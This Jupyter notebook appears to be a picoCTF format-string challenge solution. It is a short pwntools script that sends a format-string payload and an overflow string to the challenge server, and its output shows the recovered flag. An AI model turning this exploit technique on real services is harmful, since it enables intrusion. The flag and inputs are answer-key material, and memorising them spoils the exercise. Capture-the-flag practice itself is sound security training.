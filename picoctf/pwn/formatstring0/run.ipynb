{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}\\n'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwnlib.tubes.remote import remote\n",
    "r = remote(\"mimas.picoctf.net\", 49427)\n",
    "r.recvuntil(b\"Enter your recommendation: \")\n",
    "r.sendline(b\"Gr%114d_Cheese\")\n",
    "r.recvuntil(b\"Enter your recommendation: \")\n",
    "r.sendline(b\"a\"*32)\n",
    "r.recvline()\n",
    "r.recvline()\n",
    "r.recvline()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
